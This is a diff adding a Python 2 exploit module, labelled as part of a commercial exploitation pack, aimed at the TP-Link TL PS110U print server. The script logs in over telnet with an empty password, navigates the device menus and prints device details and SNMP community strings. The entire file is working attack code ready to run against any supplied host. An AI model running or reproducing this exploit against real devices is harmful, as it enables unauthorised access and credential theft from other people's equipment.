@@ -1,0 +1,61 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import telnetlib
+
+_name_   = 'd2sec_tplink_3'
+_vendor_ = 'tp-link'
+_model_  = ['TL PS110U']
+_vuln_   = 'Information disclosure'
+_cve_    = ''
+_ref_    = ''
+_port_   = 23
+
+def pwnrouter(host):
+  try:
+    tn = telnetlib.Telnet(host)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  tn.read_until("Password:")
+  tn.write("\r\n")
+  tn.read_until("choice")
+  tn.write("1\r\n")
+  tn.read_until("choice")
+  tn.write("1\r\n")
+  data = tn.read_until("choice")
+  for i in data.split("\r\n"):
+    if "Device Name" in i:
+      print i.strip()
+    if "Node ID" in i:
+      print i.strip()
+  tn.write("0\r\n")
+  tn.read_until("choice")
+  tn.write("2\r\n")
+  data = tn.read_until("choice")
+  for i in data.split("\r\n"):
+    if "Manufacture:" in i:
+      print i.strip()
+    if "Model:" in i:
+      print i.strip()
+  tn.write("0\r\n")
+  tn.read_until("choice")
+  tn.write("5\r\n")
+  data = tn.read_until("choice")
+  for i in data.split("\r\n"):
+    if "Community" in i:
+      print i.strip()
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
